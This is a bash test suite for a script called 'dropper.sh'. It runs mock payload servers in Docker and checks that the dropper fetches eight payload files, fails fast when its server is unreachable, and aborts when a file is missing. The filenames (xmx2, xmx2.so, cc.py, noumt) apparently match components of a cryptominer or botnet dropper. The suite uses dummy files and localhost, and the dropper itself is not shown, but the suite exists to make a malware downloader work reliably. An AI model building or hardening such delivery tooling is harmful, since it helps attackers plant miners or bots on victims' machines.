#!/bin/bash
set -e

echo "=== Dropper Test Suite ==="

echo "Test 1: Mock payload server (success case)"
docker run -d --rm --name test-payload -p 9999:8080 \
    -v /tmp/test-payloads:/payloads python:3.9-slim \
    sh -c 'cd /payloads && python3 -m http.server 8080' >/dev/null

mkdir -p /tmp/test-payloads
for f in xmx2 www cc.py pt xmx2.so run.sh config.json noumt; do
    echo "dummy-$f" > /tmp/test-payloads/$f
done

export PAYLOAD_SERVER="localhost"
export PAYLOAD_PORT="9999"

timeout 5 bash dropper.sh 2>&1 | tee /tmp/dropper-test.log || true

if grep -q "Downloaded 8 files" /tmp/dropper-test.log; then
    echo "✓ Test 1 passed: All payloads downloaded"
else
    echo "✗ Test 1 failed"
    cat /tmp/dropper-test.log
    exit 1
fi

docker stop test-payload >/dev/null 2>&1

echo -e "\nTest 2: Server unreachable (fail fast)"
export PAYLOAD_SERVER="nonexistent.local"
if timeout 3 bash dropper.sh 2>&1 | grep -q "Server unreachable"; then
    echo "✓ Test 2 passed: Failed fast on unreachable server"
else
    echo "✗ Test 2 failed"
    exit 1
fi

echo -e "\nTest 3: Missing payload (abort)"
docker run -d --rm --name test-payload-incomplete -p 9998:8080 \
    -v /tmp/test-payloads-incomplete:/payloads python:3.9-slim \
    sh -c 'cd /payloads && python3 -m http.server 8080' >/dev/null

mkdir -p /tmp/test-payloads-incomplete
echo "only-one-file" > /tmp/test-payloads-incomplete/xmx2

export PAYLOAD_SERVER="localhost"
export PAYLOAD_PORT="9998"

if timeout 5 bash dropper.sh 2>&1 | grep -q "Failed:"; then
    echo "✓ Test 3 passed: Aborted on missing payload"
else
    echo "✗ Test 3 failed"
    exit 1
fi

docker stop test-payload-incomplete >/dev/null 2>&1
rm -rf /tmp/test-payloads /tmp/test-payloads-incomplete /tmp/dropper-test.log

echo -e "\n=== All tests passed ==="
